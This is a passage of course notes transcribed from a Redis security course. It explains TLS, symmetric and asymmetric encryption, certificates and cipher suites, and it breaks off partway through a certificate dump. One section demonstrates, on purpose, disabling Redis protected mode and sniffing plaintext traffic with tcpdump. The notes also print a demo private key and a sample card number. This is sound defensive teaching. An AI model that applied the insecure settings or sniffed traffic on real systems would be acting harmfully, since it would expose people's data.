### On Security (cont.)


### Prologue 
This article is created from transscript of [RU330](https://redis.io/university/courses/ru330/) verbatim, not because of my laziness. But for the great significance and unstirrable value in the aforementioned narrative of the course. Nevertheless links and addenda will be appended whenever it is appropriate.


### I. [Introduction to TLS](https://youtu.be/tkfOV_zl08I)
We're now going to start learning about transport layer security, or TLS as it's commonly known. TLS is a series of protocols that secure communication across a network. For example, the connection between your web browser and the server it's connecting to is almost always secured using TLS. In Redis 6, you use TLS to secure network communications to Redis. 

**TRANSPORT LAYER SECURITY**
- Protocols that secure network communication 
- Built into Redis 6

So what exactly does TLS do? If you take a moment to consider what's required to have a private conversation over a network, you can break it down into three requirements --  

- PRIVACY
- AUTHENTICATION
- INTEGRITY

First, you need to know that your communication is private. That is no one should be able to read the messages you're sending back and forth across the network. 

Second, you need to be able to reliably identify the person or entity you're communicating with. For example, if you're trying to connect to your bank, then you need to know that the website you're connecting to is indeed run by your bank and not by some criminal pretending to be your bank. That's the authentication or identity requirement. 

Finally, you also want to know that the messages being sent back and forth between, say, you and your bank have not been corrupted or tampered with in any way. There can't be a *man in the middle* altering those messages. This is the integrity requirement. 

**TLS ALLOWS YOU TO ACHIEVE**
- Privacy 
- Identity 
- Integrity 

TLS solves all these problems, plus a few more. And the primary tools it uses to achieve this are encryption and public key infrastructure. Those two ideas may not mean much to you now. But we're going to explore them in the next few units, just before we learn exactly how to configure TLS in Redis. 

**HOW TLS SECURES CONNECTIONS**
- Encryption 
- Public key infrastructure 

If you understand encryption, even on a basic level, then you have a much better idea of what you're doing when you're configuring TLS in your own Redis deployments. 


### II. [Redis Horror Story #3](https://youtu.be/foOn3sED2EM)
Before we get into the meat of this unit, let's do one final horror story. We've talked a lot about how to secure Redis processes and Redis users. But what about the network connections themselves? In this final horror story, I want to talk about packet sniffing or packet capture. 

- Packet sniffing can be used to intercept unencrypted traffic.
- Easy to view unencrypted traffic on the network 
- TLS helps prevent packet sniffing exploits 

Packet sniffing is the act of recording the individual segments of data traveling over a network. And it's commonly used to analyze networks. The upshot is that it's pretty easy to record and view unencrypted network traffic. And that includes the traffic between your applications and your database. And if an attacker is sniffing your unencrypted network traffic, well, that can easily turn into the kind of horror stories we want to avoid. 

So let's quickly see just how easy it is to view unencrypted traffic on a network connection and how to prevent that with TLS. Here, you can see I have two terminal windows open, one is my Redis client and the other is Redis server. I'm here on the server now. I'll start my server in the least secure way I know, for demonstration purposes, obviously, without a configuration file and just with the defaults. 
```
redis-server 2>&1 > redis.out & 
```

Next, I'll disable protected mode from the command line so that we can make a remote connection. 
```
redis-cli 
config set protected-mode no 
exit
```

Finally, I'll launch `tcpdump`. `tcpdump` allows me to inspect all of the traffic running between my Redis client and the Redis server. 
```
tcpdump port 6379 
```

Now, let's switch back to our client terminal window. I'll connect to the server I've just started using the Redis CLI. Now that I'm connected, I'll write some sensitive data to Redis.
```
redis-cli -h ru330.redis 
hset user:1:secret gender m birthdate 19790101 ccn 5270426764505555 ccn_expire 1224 
```

Here, I'm entering a gender, birthday, credit card number, and credit card expiration date. Now, let's look at the output of the `tcpdump` command. If you look closely, you'll see everything I just sent to Redis, including all of the sensitive data is there. 

![alt tcp dump output](img/tcpdump-output.png)

In this example, I'm sniffing unencrypted data from the server where Redis is hosted. But this kind of surveillance can be run on any server, network switch, or router that sits between your Redis client and your Redis server. This means that usually there are quite a few opportunities for someone to sniff and record unencrypted network traffic. 

Running a `traceroute` from your client to your Redis server will give you an idea of just how many sniffing opportunities might exist. And you can't secure this network route because it's completely outside of your control. 
```
traceroute ru330.redis.cloud 
```

So let's see what happens if we encrypt our network traffic using TLS instead. I'm going to start Redis again, this time with TLS enabled. Now I'll clear my screen and start that `tcpdump` again. Moving back to my client screen, I'll now connect to Redis, this time using TLS. 
```
redis-cli -h ru330.redis --tls --cacert ca.crt 
```

This means my connection is now encrypted. Now I'll issue the same command I did before. Then, let's look again at the `tcpdump` output. See the difference? All you can see now are what appear to be a bunch of random characters. This is the value of encryption in action. Encryption protects your sensitive data from prying eyes on the network. 

For the rest of the unit, I'm going to explain how TLS works and everything you need to know to set it up with Redis. But first, two key points to remember for now. 

- First, if you're storing sensitive information in Redis, and most personal information is sensitive, then you should encrypt your Redis connections with TLS. 
- Second, even if you're using TLS, avoid public networks if you can. If you're on a private network, you greatly limit the number of attack vectors. OK. So with that out of the way, let's learn about TLS and how to use it with Redis.

**Addendum**

Life in Windows is no better than that in Linux for there is no such things as `tcpdump` bundled with. However, one can install [WinShark](https://www.wireshark.org/#homeMemberLink) which requires [Npcap](https://npcap.com/) to work together. 

![alt winshark](img/winshark-1.JPG) 

Typically, redis client uses [RESP](https://redis.io/docs/latest/develop/reference/protocol-spec/) protocol, which is plain text, to communicate with redis server. As you can see in following screens. 

![alt unsafe 1](img/unsafe-1.JPG)

![alt unsafe 2](img/unsafe-2.JPG)

All commands sent as well as results received can be cleally seen. 


### III. [Encryption](https://youtu.be/ULlTtFlSmkY)
Encryption is the process of taking a message and encoding it so that only the intended recipients can read it. The algorithm you use to encrypt a message is called a *cipher*. Most of us are familiar with basic substitution ciphers such as [ROT13](https://en.wikipedia.org/wiki/ROT13). In ROT13, you can encrypt text by substituting or rotating each letter in a message with the letter that appears 13 letters later in the Latin alphabet. So for example, suppose we start with the plain-text message "HELLO". If we encrypt "HELLO" using ROT13, we get the cipher text URYYB.

![alt HELLO](img/HELLO.png)

Shifting the H 13 letters forward gets us U and so on. To decrypt the cipher text, we just perform the reverse operation. Take a moment to see if you can decrypt the ROT13 encoded message you see on the screen now. 
```
SYNZVATB
```
```
FLAMINGO
```

Of course, the ciphers used by TLS are much more sophisticated than ROT13. TLS relies on two types of ciphers, *symmetric* key ciphers and *asymmetric* key ciphers. Now when I say key here, I'm talking about an encryption key. An encryption key is a little bit like a password, but it's generally much longer than a password and not really easy for a human to memorize. Ciphers use encryption keys to encrypt and decrypt data. 

In symmetric key cryptography, the same key is used for both encryption and decryption. 

![alt symmetric](img/symmetric-encryption.png)

In asymmetric key cryptography, one key is used for encryption, and a different key is used for decryption. 

![alt asymmetric](img/asymmetric-encryption.png)

Let's look at some examples to see how this works. 
```
hexdump -C treasure-map.txt
000000  48 61 6c 65 6c 65 61 20 46 6f 72 65 73 74 20 52  Halelea Forest R
000010  65 73 65 72 76 65 0d 0a 32 32 2e 31 31 31 38 32  eserve..22.11182
000020  35 0d 0a 2d 31 35 39 2e 34 36 34 35 30 35 0d 0a  5..-159.464505..
000030  22 58 20 6d 61 72 6b 73 20 74 68 65 20 73 70 6f  "X marks the spo
000040  74 21 22                                         t!"
```

If you've ever encrypted a file, you've probably used a symmetric key cipher. Here I'm using the `gpg` command line utility to encrypt a file called treasure-map.txt.
```
gpg --symmetric --cipher-algo AES256 --no-symkey-cache --output treasure-map.encrypted treasure-map.txt

hexdump -C treasure-map.encrypted
000000  8c 0d 04 09 03 02 8d 03 43 0b 9b 93 fb 49 f5 d2  ........C....I..
000010  87 01 99 a6 ba b1 5a 51 12 31 fa f8 5f d0 07 d7  ......ZQ.1.._...
000020  b0 4a a9 11 c2 aa 13 12 5c 1d 8e 52 99 7c 38 23  .J......\..R.|8#
000030  18 73 da 20 e2 88 67 24 c7 bf 20 54 53 9a a4 0d  .s. ..g$.. TS...
000040  03 2d c2 c8 45 d7 cc 43 2f 49 95 3f de e0 0d bd  .-..E..C/I.?....
000050  62 6f ba f7 81 53 0f a6 4a 1d f2 0d 90 23 67 dd  bo...S..J....#g.
000060  ed e7 13 f1 b7 dd 9a b4 86 c4 36 fc 97 1f f4 8e  ..........6.....
000070  64 ed 03 1d 37 0d 5e 7e 32 6d 60 2b f7 44 0c a6  d...7.^~2m`+.D..
000080  cd 96 e9 7a 53 5d 00 e6 03 37 83 76 00 2e d1 0a  ...zS]...7.v....
000090  8f c2 cd fb 49 0b 22 03                          ....I.".
```

Here I'm specifying that I want symmetric encryption, that I want to use the AES256 cipher, which is a commonly used symmetric key cipher, that the output should be written to a file called treasure-map.encrypted, and that the file I want to encrypt is called treasure-map.txt. 

When I run this command, the program asks me for a password. Now this is important. 

![alt passphrase](img/passphrase.JPG)

gpg uses the password I enter to generate an encryption key, and then it uses that encryption key to encrypt the file. So now we can see the encrypted file.

To decrypt the file, I run gpg's decrypt command, providing the password that I use to encrypt the file.
Again, gpg then uses that password to generate the key that will successfully decrypt the file.
```
gpg --decrypt treasure-map.encrypted
gpg: AES256 encrypted data
gpg: encrypted with 1 passphrase
Halelea Forest Reserve
22.111825
-159.464505
"X marks the spot!"
D:\RU\RU330>123456789
```

Clearly, you need to keep the password and encryption keys secret if you want your encrypted file to remain secret. 

Now suppose it's my friend, Captain Long Beard, who wants to send me the encrypted treasure map. If I want to receive this encrypted map, then I also need to receive the password or key that was used to encrypt it, but of course, I run into a problem here. How is that Captain securely share the key with me?  He needs to be very careful when sharing his secret key because if it gets into anyone else's hands, then they'll be able to decrypt the map. That's where asymmetric key encryption comes in. 

As I mentioned, asymmetric key ciphers use two keys, one to encrypt and another to decrypt. The key to encrypt is called the *public* key, and the key to decrypt is called the *private* key. Do you see why? You can share your public key far and wide, and it doesn't matter who gets access to it. Public keys are meant to be publicly distributed. I can safely share my public key in an email, a tweet, or a published blog post. Once Captain Long Beard has my public key, he can use it to encrypt messages for me. To decrypt those messages, I need to use my private key. Obviously, then, I need to keep my private key secret. We're going to use the openssl command line utility to see how asymmetric encryption works in action.

First, I'm going to generate my private key, so I run the `openssl genrsa` command. This creates the file that I'll use as my private key. Remember that this file can't be shared with anyone. Here's what the contents of the file look like. 
```
openssl genrsa -out key.pem 2048
Generating RSA private key, 2048 bit long modulus
............................................................+++++
...............................................................................................................................................................................+++++
e is 65537 (0x010001)

head -n 15 key.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2AvmKYv4rX6WbjN7US2sca0OzOqDaiB2mSOi1J8gMeAs/ZxQ
ZV6IFxw/djpn1H6RxqsSWKvMMzwWZdz/wOIphPEcxpKDR+Zmhd+i7kJ/5OEOWc26
gI1yquPzZ2exNdC0vEs4fnZopqABNzngugXvLolmzNvH6gRh7DUelBqIw59Xt8h1
7/W9nWG64/9wKs+jblgFNAHjPiQYd5zdurcfwiX9wuPJ1M8QjMlpteIMrpczp6UL
i74Ra6miEcg6MtwkruG2PtLX0jSJEOOX/WTSbUsSRMpZdnK6J+sLaVpp4gZerznV
oG4D1Ib044JwFC0EHHxW1UPsZ63H44mXSfu1IwIDAQABAoIBAQCPd1dgP5LjoyxC
Ae3h+nKJCmLJsPGTh/s5tnBqwUCf3j4CK8s3hY7Zyehamm5YrbQgOXn1aCAx5bT5
78fmTklD/tkdBC4pkNaED/4iOgaz9r+Q4wz2UPfUg4sfH7yOAAoE/+6EDB1yiM5F
3ildXpN2U8fwQgJ/ZGmicaPctcIcJHuUXZR17aosBs4u8pKm/eli87RFmUF0JyM+
UQ8Kv5VSMCubEqNifIHfyJfrm10aftRRMYvXuFb6CMF3MtGQ+/mGwcjNhAkDVye7
ojTR+JlAWqsRd8Jqy0IwhTOVt2rD4khdRktEOzdvnjdpz3TWY68ARtoh1K8E68GA
lIKZ0XABAoGBAPNmtBFSXzSqbcYwlN/xYtURw2rm4VN8os/p4K4DWiNmSz13DGj1
8OgyebAEBNAhNt3Q8fGmu4+YHW3je2UJgePZLX9EYHYzqZ395vj8567tnUlDv6HN
xngg0b4tFUrtZt+citK9C+Gm9divtXhADdU2Ro7kqE7Zld3CpXknsZKlAoGBAOM6
```

Now, an interesting fact is that the private key file actually contains the public key, but we need to extract it. So here's the command to do that, and here's what the public key actually looks like. 
```
openssl rsa -in key.pem -out key.pub -pubout
writing RSA key

cat key.pub
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2AvmKYv4rX6WbjN7US2s
ca0OzOqDaiB2mSOi1J8gMeAs/ZxQZV6IFxw/djpn1H6RxqsSWKvMMzwWZdz/wOIp
hPEcxpKDR+Zmhd+i7kJ/5OEOWc26gI1yquPzZ2exNdC0vEs4fnZopqABNzngugXv
LolmzNvH6gRh7DUelBqIw59Xt8h17/W9nWG64/9wKs+jblgFNAHjPiQYd5zdurcf
wiX9wuPJ1M8QjMlpteIMrpczp6ULi74Ra6miEcg6MtwkruG2PtLX0jSJEOOX/WTS
bUsSRMpZdnK6J+sLaVpp4gZerznVoG4D1Ib044JwFC0EHHxW1UPsZ63H44mXSfu1
IwIDAQAB
-----END PUBLIC KEY-----
```

So now I just need to send my public key to the Captain. It doesn't matter how I send it because it's only used for encryption, not decryption. I can send it over email, or I can paint it on a billboard. 

Now Captain Long Beard can use my public key to encrypt the file containing the treasure map. This is the openssl command he'll run. 
```
openssl rsautl -in treasure-map.txt -out treasure-map.encrypted -pubin -inkey key.pub -encrypt

hexdump -C treasure-map.encrypted
000000  32 c8 72 66 ae fc a4 77 33 49 cf 7a b0 da ff 2b  2.rf...w3I.z...+
000010  72 98 c5 e0 86 bd 0e 63 ba fa d1 1a 30 67 d2 ed  r......c....0g..
000020  7a 63 01 05 a9 90 a1 6b fa 46 e6 bb e0 c1 d2 3e  zc.....k.F.....>
000030  e0 9a e6 fe ff 2a eb c3 70 08 44 ca 3d cd c2 bf  .....*..p.D.=...
000040  68 99 31 9b 99 aa 37 a5 ab a0 d0 7f 70 f9 2f 02  h.1...7.....p./.
000050  ea 7c c8 db c2 ac 9d 8b 17 f2 02 5f df 3c 63 07  .|........._.<c.
000060  36 7b a0 eb cf 88 43 f6 83 88 13 fd 6a cd 0a 86  6{....C.....j...
000070  27 ac ee 61 01 38 71 c2 16 b7 87 c6 66 59 27 a9  '..a.8q.....fY'.
000080  26 19 06 c7 7c cc de 5a 52 22 e2 42 9a 40 44 9c  &...|..ZR".B.@D.
000090  5b f1 83 aa db f5 5c 55 00 d2 c8 27 85 91 46 d6  [.....\U...'..F.
0000a0  c8 bc e6 28 a3 b1 6e 18 c0 fe 47 02 a7 79 a5 49  ...(..n...G..y.I
0000b0  ea 17 e7 36 50 4e 89 3d 39 e5 d5 4f 1d fa 72 57  ...6PN.=9..O..rW
0000c0  84 29 35 ed 56 f5 7e 55 1e 9e 6b 14 cb 12 37 c9  .)5.V.~U..k...7.
0000d0  0a 31 a7 dc c8 eb 4b c5 27 c9 06 40 52 9c fb a5  .1....K.'..@R...
0000e0  78 b0 fa 1f 7e 3d 7f 44 f9 61 0b 44 af 91 a9 e8  x...~=.D.a.D....
0000f0  20 66 8e 14 dd dc 23 d6 22 d6 54 90 ff 76 83 a4   f....#.".T..v..
```

He then sends me the encrypted file, treasure-text.encrypted. Once I get the file, I use my private key to decrypt it. Here's the openssl command I'll run. 
```
rsautl -in treasure-map.encrypted -inkey key.pem -decrypt
Halelea Forest Reserve
22.111825
-159.464505
"X marks the spot!"
```

If I'm using the correct private key, then I'll be able to decrypt the cipher text into the plain text message that leads me to the treasure. 

OK. So there's another important difference between asymmetric key and symmetric key ciphers, which is performance. Asymmetric key ciphers are much more computationally expensive and often thousands of times slower than symmetric key ciphers, so if you need to encrypt a lot of data, you should actually use a symmetric key cipher. And TLS actually uses both.

TLS uses asymmetric key cryptography to help the two parties establish a shared secret key, and then TLS switches to symmetric key cryptography for all subsequent exchange of data. 

![alt performance considerations](img/performance-considerations.png)

Let me elaborate on that just a bit. Here's how a TLS connection to your bank works on a very rudimentary level. 

- Step one, you connect to your bank's website. 
- Step two, your bank sends you its public key. 
- Step three, you use the bank's public key to encrypt and send a large random number. 
- Step four, the bank decrypts the number with its private key. Now you and your bank both have this secret, random number. 
- Step five, you and your bank independently use this secret random number to generate an encryption key that you'll use with symmetric cryptography. 
- Step six, communication then switches to using a symmetric key cipher. You and your bank then encrypt and decrypt all subsequent communication using the same encryption key you both just independently generated. 

![alt bank-1](img/bank-1.png)

![alt bank-2](img/bank-2.png)

OK. We've just covered a lot of material, and you may need to re-watch this video to really master it. But at this point, you should have a sense for what encryption is and how it ensures the privacy of a conversation. In the next units, we'll see how TLS solves the problems of authenticity and integrity.

- [gpg - GNU Privacy Guard](https://gnupg.org/)

- [OpenSSL Command Line Utilities](https://wiki.openssl.org/index.php/Command_Line_Utilities)


### IV. [Authentication](https://youtu.be/aD9L_hlXx04)
In the last unit, we looked at the basics of encryption and a simplified version of TLS. You should recall that a TLS connection starts with the exchange of a public key. Of course, public keys are designed to be shared freely. But there's a problem here that we haven't discussed.

If someone provides you with their public key over the internet, how do you know that the public key you've been given actually belongs to the person you want to communicate with? This is the problem of *authentication*. And TLS solves this problem using a variety of techniques. These include: 

- asymmetric-key ciphers 
- certificates 
- certificate authorities 
- digital signatures 

By the end of this unit, you'll understand each of these concepts and how they're combined to create secure, authenticated connections. 

Let's review how a TLS connection is initiated. Say you want to create a secure connection to your bank, which lives at the URL, moneybags.com. When you navigate to https://moneybags.com with your browser, you're announcing that you'd like to connect to a server hosted on this domain. So a server at moneybags.com then sends you its public key.

![alt moneybag 1](img/moneybag-1.png)

Now it's time to put on your *paranoid hat*. Suppose an evil underground organization has taken control of moneybags.com and rerouted the domain to their *nefarious* servers. If that's happened, then the public key you've been given doesn't belong to your bank at all. It belongs to an attacker. And that means that any data you encrypt and send with that public key can and will be read by the bad guys. 

![alt moneybag 2](img/moneybag-2.png)

So you need a way to verify that the public key you've received indeed belongs to the server you're connecting to. Again, this is called *authentication*. TLS solves the authentication problem first by using a trusted third party. 

To understand the idea of a trusted third party, let's think about a passport. I'm an American citizen. So I carry a US passport. When I travel internationally, I present my passport to identify myself. Suppose I'm traveling to the country of [Lilliput](https://en.wikipedia.org/wiki/Lilliput). If I don't have a passport, the Lilliputian border control isn't going to let me in the country. Why? Because they have no way of verifying that I'm the person I say I am. But if I have a valid US passport, then they will trust me. Why?

Because hopefully they trust the US government. And the US government, by issuing me a passport, is vouching for my identity. So to break this down, my passport is a document that certifies my identity. The US government is a third party that issued my passport. To enter a new country, I need a passport issued by a trusted third party. If the Lilliputian government trusts the US government to issue valid passports, and if I have a valid US passport, then I can enter the country.

An important point here is that each government gets to decide which third parties, or which other governments, it's going to trust to issue valid passports. So let's take the analogy back to TLS. When you connect to your bank online. The bank presents its public key in the form of a *digital certificate*. A digital certificate is an electronic document that proves ownership of a public key. This document is issued by a third party known as a *certificate authority*. The certificate contains a public key. But it also contains a *digital signature* which validates the contents of the certificate. 

![alt digital certificate](img/digital-certificate.png)

To complete the analogy, the digital certificate is like a passport. The certificate authority is like the government that issued the passport. And the digital signature is *akin* to the physical features of the passport that allow a border agent to verify its authenticity, things like watermarks, holograms, and biometric chips. 

So let's briefly look at a real website to see how this all works. Here, I'm connecting to https://wikipedia.org. If my browser successfully connects, then I'll see a little lock icon to the left of the address. I can click on this icon to get more information about the security of the connection. Specifically, I can view Wikipedia's server certificate. This is the certificate that was presented to my web browser when it initially connected. 

You can see it first that this certificate is for servers accessible at *.wikipedia.org. So wikipedia.org plus any subdomain. You can also see when the certificate expires. Scroll down a bit further and you'll see the public key, along with which asymmetric key cipher was used to generate it. In this case, it was an elliptical curve cipher. You can also see the signature that verifies the key along with the algorithm used to generate it.

Finally, you should also notice the name of the certificate authority that signed this certificate. In this case, the certificate authority is called Let's Encrypt. Let's Encrypt is what's known as a intermediate certificate authority.

What validates the authority of an intermediate certificate authority? A root certificate authority does that. Here, the root certificate authority that verifies Let's Encrypt as a valid certificate authority is the digital signature trust company. Its root certificate is called DST Root CA X3. Your browser or operating system maintains a list of root certificate authorities that it implicitly trusts. On Mac OS, you can see a list of all the root certificates it trusts by opening up the **keychain app**.

So here's the list of authorities that my system trusts. And you can see the DST Root CA certificate authority that certifies the Let's Encrypt certificate authority, which certifies Wikipedia's certificate. And by the way, there's a name for this web of root and intermediate certificate authorities that certify the authenticity of digital certificates. It's known as **Public Key Infrastructure**, or **PKI**.

Anyway, what all this means is that for a certificate to be trusted, the certificate must be traceable back to a trusted root certificate authority. So to take this full circle, the root certificate authorities are the trusted third parties you use to authenticate the public key of any server you connect to.

Your browser will form a secure connection if: 
- Certificate presented matches the domain name of the server you're trying to connect to, so, in this case, wikipedia.org
- Certificate can be traced back to a trusted third party which will include any root certificate authority trusted by your browser

That's pretty amazing, right? What all this implies is that it's really important that all of the root certificates installed in your browser or computer are trustworthy. If an attacker were able to install a root certificate on your computer, then they might be able to implement various [man in the middle attacks](https://www.strongdm.com/blog/man-in-the-middle-attack). Describing how this works in detail is beyond the scope of this course, but I encourage you to go do some casual research to learn about how these attacks have occurred in the past.

- [Digital Certificates (Wikipedia)](https://en.wikipedia.org/wiki/Public_key_certificate)

- [Certificate Authority (Wikipedia)](https://en.wikipedia.org/wiki/Certificate_authority)

- [Man-in-the-middle Attack (Wikipedia)](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)

**Addendum**

To check the list of certificates in Windows 10, you can use the Microsoft Management Console (MMC) and the Certificate Manager snap-in. Here's how you can access and view the certificates:

1. Press the `Windows key + R` on your keyboard to open the "Run" dialog box.
2. Type **mmc** and press Enter. This will open the Microsoft Management Console.
3. In the Microsoft Management Console window, go to "File" -> "Add/Remove Snap-in".
4. In the "Add or Remove Snap-ins" window, select "Certificates" and click the "Add" button.
5. In the next window, select "Computer account" and click the "Next" button.
6. Choose "Local computer" and click the "Finish" button.
7. Click the "OK" button to close the "Add or Remove Snap-ins" window.
8. In the Microsoft Management Console window, expand "Certificates (Local Computer)".
9. You will see a list of certificate stores, such as "Personal", "Trusted Root Certification Authorities", "Intermediate Certification Authorities", etc.
10. Expand the desired certificate store to view the certificates within that store.

![alt mmc](img/mmc.JPG)

You can now browse through the certificate stores and view the individual certificates within each store. The certificates will be listed with their details, including the certificate name, issuer, expiration date, and other relevant information.

Please note that accessing and managing certificates may require administrative privileges. Additionally, the specific certificate stores and the certificates available may vary depending on your system configuration and installed applications. 
(Generated by ChatGPT)


### V. Integrity, Cipher Suites and TLS Versioning
#### Intro
In the last two units we learned about encryption and authentication. And although we haven't yet gotten into [the nitty gritty](https://dictionary.cambridge.org/dictionary/english-chinese-traditional/nitty-gritty) details of TLS, you should now have a basic understanding of how it all works.

In this unit, we'll briefly discuss integrity, and we'll round out this overview of TLS by talking about cipher suites and TLS versions. Recall that TLS provide three assurances:

#### Integrity
First, TLS provides **privacy** through the use of encryption.

Second, TLS provides **authentication** through the use of encryption, digital certificates, and certificate authorities.

Lastly, TLS provides message **integrity**. Let's define this here. Message integrity means two things:

1. That the message has not been tampered with.

2. That the message was produced by a given sender.

To understand integrity, we need to remember how TLS establishes an encrypted connection.

First, TLS uses an asymmetric-key cipher to securely establish a shared encryption key. The client and server then switch to a symmetric-key cipher, which uses that shared encryption key to securely encrypt and decrypt data.

In addition to the symmetrically encrypted data, each party also attaches a cryptographic signature known as a **message authentication code**, or **MAC** for short. You can think of a message authentication code as a secure checksum for encrypted data.

The party receiving the data can use this message authentication code to cryptographically verify two things:

First: that the data has not been tampered with during transmission

And second: that the data has been encrypted by someone who possesses the shared encryption key (and not, we hope, by an attacker).

#### Cipher Suites
If we take a step back now, we'll see that TLS actually relies on several cryptographic algorithms:

First, there's the **asymmetric-key cipher** and its associated key exchange protocol.

Next, there's the **digital signature algorithm** that's used to authenticate a certificate.

After that, you have a **symmetric-key cipher**.

And finally, there's a **message authentication code**, which is used to check the integrity of messages.

As you might expect, there are many different implementations of each of these cryptographic algorithms. For example, with symmetric-key ciphers, there's the Advanced Encryption Standard (which is commonly known as AES), the Triple-DES, and Camellia, among others.

What this all means is that when you initiate a TLS connection, your client and server need to agree on which implementations they're going to use.

The set of specific cryptographic implementations used for a given TLS connection is called a **cipher suite**.

#### Example with openssl
When you connect to a server using TLS, your client and server will agree on a specific cipher suite. You can use the `openssl` command line utility to see which cipher suite is used when you connect to https://wikipedia.org. Here is what you would run:
```
openssl s_client -connect wikipedia.org:443
```

And here is part of the output you might see if you run this command:
```
openssl s_client -connect wikipedia.org:443
CONNECTED(000001A8)
depth=1 C = US, O = DigiCert Inc, CN = DigiCert TLS Hybrid ECC SHA384 2020 CA1
verify error:num=20:unable to get local issuer certificate
---
Certificate chain
 0 s:/C=US/ST=California/L=San Francisco/O=Wikimedia Foundation, Inc./CN=*.wikipedia.org
   i:/C=US/O=DigiCert Inc/CN=DigiCert TLS Hybrid ECC SHA384 2020 CA1
 1 s:/C=US/O=DigiCert Inc/CN=DigiCert TLS Hybrid ECC SHA384 2020 CA1
   i:/C=US/O=DigiCert Inc/OU=www.digicert.com/CN=DigiCert Global Root CA
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIISzCCB9GgAwIBAgIQB0GeOVg6THbPHqFDR/pfOjAKBggqhkjOPQQDAzBWMQsw
CQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMTAwLgYDVQQDEydEaWdp
Q2VydCBUTFMgSHlicmlkIEVDQyBTSEEzODQgMjAyMCBDQTEwHhcNMjMxMDE4MDAw
MDAwWhcNMjQxMDE2MjM1OTU5WjB5MQswCQYDVQQGEwJVUzETMBEGA1UECBMKQ2Fs
aWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZyYW5jaXNjbzEjMCEGA1UEChMaV2lraW1l
ZGlhIEZvdW5kYXRpb24sIEluYy4xGDAWBgNVBAMMDyoud2lraXBlZGlhLm9yZzBZ
MBMGByqGSM49AgEGCCqGSM49AwEHA0IABDVh9CEa/2rEO/oGR8YZbr5wOPHcFrG8
OBQS1BQrHAsxgVn1Z/bnKtE8Hvqup+0GXdZvXYlMa8iw4A+Dz/XTitqjggZcMIIG
WDAfBgNVHSMEGDAWgBQKvAgpF4ylOW16Ds4zxy6z7fvDejAdBgNVHQ4EFgQUyqwM
Z6LjhkM/u0PnQdmhhzp43TMwggLtBgNVHREEggLkMIIC4IIPKi53aWtpcGVkaWEu
b3Jngg13aWtpbWVkaWEub3Jngg1tZWRpYXdpa2kub3Jngg13aWtpYm9va3Mub3Jn
ggx3aWtpZGF0YS5vcmeCDHdpa2luZXdzLm9yZ4INd2lraXF1b3RlLm9yZ4IOd2lr
aXNvdXJjZS5vcmeCD3dpa2l2ZXJzaXR5Lm9yZ4IOd2lraXZveWFnZS5vcmeCDndp
a3Rpb25hcnkub3Jnghd3aWtpbWVkaWFmb3VuZGF0aW9uLm9yZ4IGdy53aWtpghJ3
bWZ1c2VyY29udGVudC5vcmeCESoubS53aWtpcGVkaWEub3Jngg8qLndpa2ltZWRp
YS5vcmeCESoubS53aWtpbWVkaWEub3JnghYqLnBsYW5ldC53aWtpbWVkaWEub3Jn
gg8qLm1lZGlhd2lraS5vcmeCESoubS5tZWRpYXdpa2kub3Jngg8qLndpa2lib29r
cy5vcmeCESoubS53aWtpYm9va3Mub3Jngg4qLndpa2lkYXRhLm9yZ4IQKi5tLndp
a2lkYXRhLm9yZ4IOKi53aWtpbmV3cy5vcmeCECoubS53aWtpbmV3cy5vcmeCDyou
d2lraXF1b3RlLm9yZ4IRKi5tLndpa2lxdW90ZS5vcmeCECoud2lraXNvdXJjZS5v
cmeCEioubS53aWtpc291cmNlLm9yZ4IRKi53aWtpdmVyc2l0eS5vcmeCEyoubS53
aWtpdmVyc2l0eS5vcmeCECoud2lraXZveWFnZS5vcmeCEioubS53aWtpdm95YWdl
Lm9yZ4IQKi53aWt0aW9uYXJ5Lm9yZ4ISKi5tLndpa3Rpb25hcnkub3JnghkqLndp
a2ltZWRpYWZvdW5kYXRpb24ub3JnghQqLndtZnVzZXJjb250ZW50Lm9yZ4INd2lr
aXBlZGlhLm9yZ4IRd2lraWZ1bmN0aW9ucy5vcmeCEyoud2lraWZ1bmN0aW9ucy5v
cmcwPgYDVR0gBDcwNTAzBgZngQwBAgIwKTAnBggrBgEFBQcCARYbaHR0cDovL3d3
dy5kaWdpY2VydC5jb20vQ1BTMA4GA1UdDwEB/wQEAwIDiDAdBgNVHSUEFjAUBggr
BgEFBQcDAQYIKwYBBQUHAwIwgZsGA1UdHwSBkzCBkDBGoESgQoZAaHR0cDovL2Ny
bDMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0VExTSHlicmlkRUNDU0hBMzg0MjAyMENB
MS0xLmNybDBGoESgQoZAaHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0
VExTSHlicmlkRUNDU0hBMzg0MjAyMENBMS0xLmNybDCBhQYIKwYBBQUHAQEEeTB3
MCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTwYIKwYBBQUH
MAKGQ2h0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRMU0h5YnJp
ZEVDQ1NIQTM4NDIwMjBDQTEtMS5jcnQwDAYDVR0TAQH/BAIwADCCAYAGCisGAQQB
1nkCBAIEggFwBIIBbAFqAHcA7s3QZNXbGs7FXLedtM0TojKHRny87N7DUUhZRnEf
tZsAAAGLQ1J6cgAABAMASDBGAiEA5reeeuLSzGPvJQ5hT3Bd8aOVxmIltXMTLhY6
19qDGWUCIQDO0LMbF3s42tyxgFIOt7rVOpsHe9Sy0wFQQj8BWO0LIQB2AEiw42va
pkc0D+VqAvqdMOscUgHLVt0sgdm7v6s52IRzAAABi0NSegEAAAQDAEcwRQIgYJdu
BrioIun6FTeQhDxqK2eyZehguOkxScS3nwsGSakCIQC1FyuCpm+QQBRJFSTAnStR
iP+hgGIhgzyZ837usahB0QB3ANq2v2s/tbYin5vCu1xr6HCRcWy7UYSFNL2kPTBI
1/urAAABi0NSeg8AAAQDAEgwRgIhAOm1GvY8M4V+tUyjV9/PCj8rcWHUOvfY0a/o
nsKg/bitAiEA1Vm1pP8CDp7hGcQzBBTscpCVebzWCe8DK231mtv97QUwCgYIKoZI
